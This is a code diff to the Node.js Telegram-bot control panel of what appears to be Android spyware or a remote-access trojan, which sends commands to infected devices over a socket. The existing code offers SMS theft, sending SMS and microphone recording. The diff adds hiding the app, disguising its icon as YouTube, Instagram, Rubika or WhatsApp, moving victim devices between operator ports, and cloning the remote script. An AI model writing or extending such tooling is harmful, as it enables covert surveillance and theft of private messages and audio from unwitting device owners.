@@ -8,13 +8,13 @@
 // const portnumb = 9932;
 
 
-const TelegramBot = require("node-telegram-bot-api");
-const net = require("net");
-const fs = require("fs");
-const crypto = require("crypto");
-const { exec } = require("child_process");
-const me = new net.Socket();
-const bot = new TelegramBot(token, { polling: true });
+const TelegramBot      = require("node-telegram-bot-api");
+const net              = require("net");
+const fs               = require("fs");
+const crypto           = require("crypto");
+const { exec }         = require("child_process");
+const me               = new net.Socket();
+const bot              = new TelegramBot(token, { polling: true });
 
 let updating_users = [];
 let steps = {};
@@ -106,7 +106,7 @@ function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
     let layer_index = 0;
 
     access_list.push("changePortPassword");
-    //access_list.push("")
+    access_list.push("changeUsersOwning")
 
     if (access_list.includes("getAllSMS") || access_list.includes("sendSMS") || access_list.includes("setSMSFilter") || access_list.includes("removeSMSFilter")){
         layers[layer_index].push({
@@ -230,10 +230,31 @@ function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
                     callback_data: `recordMicrophone_${msgowner}_${devid}`
                 });
                 break;
+            case "hideApp":
+                layers[layer_index].push({
+                    text: build("hide 🌚"),
+                    callback_data: `hideApp_${msgowner}_${devid}`
+                });
+            case "unhideApp":
+                layers[layer_index].push({
+                    text: build("unhide 🌝"),
+                    callback_data: `unhideApp_${msgowner}_${devid}`
+                });
+            case "changeIcon":
+                layers[layer_index].push({
+                    text: build("change-icon💬"),
+                    callback_data: `changeIcon_${msgowner}_${devid}`
+                });
             case "changePortPassword":
                 layers[layer_index].push({
-                    text: build("change-pass🌐"),
+                    text: build("change-pass 🌐"),
                     callback_data: `changePortPassword_${realadmin}_${devid}`
+                });
+                break;
+            case "changeUsersOwning":
+                layers[layer_index].push({
+                    text: build("move-users 🛢"),
+                    callback_data: `changeUsersOwning_${realadmin}_${devid}`
                 });
                 break;
         }
@@ -265,6 +286,13 @@ function build(string) {
     return string.split('').map(char => translationTable[char] || char).join('');
 }
 
+function guessApp(nickname){
+    if (nickname == "yt"){return "youtube"}
+    else if (nickname == "in"){return "instagram"}
+    else if (nickname == "rb"){return "rubika"}
+    else if (nickname == "wt"){return "whatsapp"}
+}
+
 function convertBytes(numBytes) {
     const conversions = {
         bytes: numBytes,
@@ -291,7 +319,7 @@ function combinePath(dirname, filename){
     }
 }
 
-function createClone(newpassword, remote_basic_info){
+async function createClone(newpassword, remote_basic_info){
     let ahash = crypto.createHash("md5").update((Math.floor(Math.random() * 999999999999) - 100000).toString()).digest('hex').slice(0, 10);
     let starter = `const token = "${remote_basic_info.token}"\nconst chat_group = ${remote_basic_info.chat_group}\nconst portname = "${remote_basic_info.portname}"\nconst passname = "${newpassword}"\nconst admins = []\nconst realadmin = ${remote_basic_info.realadmin}\nconst hostname = "${remote_basic_info.hostname}"\nconst portnumb = ${remote_basic_info.portnumb}\n`;
     let remote_source = fs.readFileSync("remote.js");
@@ -559,7 +587,7 @@ bot.on("message", async (message) => {
                         sms: message.text,
                         shortcut: {
                             chat_id: message.chat.id,
-                            message_id: rmsg.message_id,
+                            message_id: message.message_id,
                             sms: message.text,
                             device_id: devid,
                             edit: false
@@ -586,7 +614,7 @@ bot.on("message", async (message) => {
                         sms: steps[message.from.id]['sms'],
                         shortcut: {
                             chat_id: message.chat.id,
-                            message_id: rmsg.message_id,
+                            message_id: message.message_id,
                             sms: steps[message.from.id]['sms'],
                             device_id: devid,
                             tonumber: message.text,
@@ -607,7 +635,7 @@ bot.on("message", async (message) => {
                         filter_number: message.text,
                         shortcut: {
                             chat_id: message.chat.id,
-                            message_id: rmsg.message_id,
+                            message_id: message.message_id,
                             device_id: devid,
                             filter_number: message.text,
                             edit: false
@@ -648,11 +676,68 @@ bot.on("message", async (message) => {
                             new_password: message.text,
                             shortcut: {
                                 chat_id: message.chat.id,
-                                message_id: rmsg.message_id,
+                                message_id: message.message_id,
                                 new_password: message.text,
                                 edit: false
                             }
                         }));
+                        await createClone(message.text, {
+                            token: token,
+                            chat_group: chat_group,
+                            portname: portname,
+                            realadmin: realadmin,
+                            hostname: hostname,
+                            portnumb: portnumb
+                        });
+                    }
+                } else if (mode == "getNewOwningPort"){
+                    steps[message.from.id]['mode'] = "getNewOwningPassword";
+                    steps[message.from.id]['port'] = message.text;
+                    await bot.sendMessage(
+                        message.chat.id,
+                        build(`📚 ${sym} send the password which you want move your users into that port`),
+                        {
+                            reply_to_message_id: message.message_id
+                        }
+                    )
+                } else if (mode == "getNewOwningPassword"){
+                    steps[message.from.id]['mode'] = "getNewOwningUsersLength";
+                    steps[message.from.id]['password'] = message.text;
+                    await bot.sendMessage(
+                        message.chat.id,
+                        build(`👥 ${sym} send number which is the length of users will move into the `) + steps[message.from.id]['port'],
+                        {
+                            reply_to_message_id: message.message_id
+                        }
+                    )
+                } else if (mode == "getNewOwningUsersLength"){
+                    if (/^\d+$/.test(message.text)){
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`✈ ${sym} trying to move users\n🏮 ${sym} `) + steps[message.from.id]['port'],
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        ).then(async (rmsg) => {
+                            me.write(JSON.stringify({
+                                port: portname,
+                                password: passname,
+                                method: "changeUsersOwning",
+                                mask: "metro",
+                                new_password: steps[message.from.id]['password'],
+                                new_port: steps[message.from.id]['port'],
+                                userslength: parseInt(message.text),
+                                shortcut: {
+                                    chat_id: message.chat.id,
+                                    message_id: rmsg.message_id,
+                                    new_password: steps[message.from.id]['password'],
+                                    new_port: steps[message.from.id]['port'],
+                                    userslength: parseInt(message.text),
+                                    edit: true
+                                }
+                            }));
+                            delete steps[message.from.id];
+                        })
                     }
                 }
             }
@@ -1215,6 +1300,103 @@ bot.on("callback_query", async (call) => {
                     message_id: call.message.message_id
                 }
             )
+        }  else if (mode == "changeUsersOwning"){
+            steps[call.from.id] = {
+                mode: "getNewOwningPort"
+            };
+            await bot.editMessageText(
+                build(`⛽ ${sym} send the port which you want move your users into that`),
+                {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id
+                }
+            )
+        } else if (mode == "hideApp"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "hideApp",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "unhideApp"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "unhideApp",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "changeIcon"){
+            await bot.editMessageText(
+                build(`🗄 ${sym} select an icon which you want to change into that`),
+                {
+                    message_id: call.message.message_id,
+                    chat_id: call.message.chat.id,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: build("youtube ▶"),
+                                    callback_data: `ci_${uid}_${spl[2]}_yt`
+                                },
+                                {
+                                    text: build("instagram 📷"),
+                                    callback_data: `ci_${uid}_${spl[2]}_in`
+                                }
+                            ],
+                            [
+                                {
+                                    text: build("rubika 🔲"),
+                                    callback_data: `ci_${uid}_${spl[2]}_rb`
+                                },
+                                {
+                                    text: build("whatsapp 💭"),
+                                    callback_data: `ci_${uid}_${spl[2]}_wt`
+                                }
+                            ],
+                            [
+                                {
+                                    text: build("🔙 back"),
+                                    callback_data: `seemyuser_${uid}_${spl[2]}`
+                                },
+                                {
+                                    text: build("close"),
+                                    callback_data: `close_${uid}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            )
+        } else if (mode == "ci"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "changeIcon",
+                device_id: spl[2],
+                icon: guessApp(spl[3]),
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    icon: guessApp(spl[3]),
+                    edit: true
+                }
+            }));
         }
     }
 })
